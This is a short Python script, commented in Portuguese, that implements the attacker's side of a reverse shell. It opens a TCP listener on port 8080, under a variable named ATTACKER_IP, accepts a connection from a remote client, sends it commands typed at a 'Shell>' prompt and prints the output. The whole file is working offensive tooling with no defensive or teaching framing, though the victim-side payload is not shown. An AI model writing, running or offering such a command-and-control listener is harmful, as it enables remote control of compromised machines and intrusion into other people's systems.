import socket

# Configurações do listener
ATTACKER_IP = '0.0.0.0'  # Escuta todas as interfaces
ATTACKER_PORT = 8080  # Porta onde o listener ficará escutando

# Função para gerenciar os comandos
def handle_commands(connection):
    while True:
        # Recebe o comando do usuário
        command = input("Shell> ")

        # Envia o comando para o cliente
        if command.strip() != "":
            connection.send(command.encode())
        
        # Sai do loop se o comando for "exit"
        if command.lower() == "exit":
            print("Encerrando conexão...")
            break
        
        # Recebe a resposta do cliente
        result = connection.recv(4096).decode('latin1')
        print(result)

def start_listener():
    # Cria o socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Reutiliza o endereço local em caso de restart
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Liga o socket ao endereço e porta especificados
    server_socket.bind((ATTACKER_IP, ATTACKER_PORT))
    
    # Escuta por conexões (máximo de 5 na fila)
    server_socket.listen(5)
    print(f"[*] Escutando em {ATTACKER_IP}:{ATTACKER_PORT}...")

    # Aceita a conexão do cliente
    connection, address = server_socket.accept()
    print(f"[*] Conexão recebida de {address[0]}:{address[1]}")

    # Chama a função para tratar comandos
    handle_commands(connection)

    # Fecha a conexão e o socket
    connection.close()
    server_socket.close()

if __name__ == "__main__":
    start_listener()
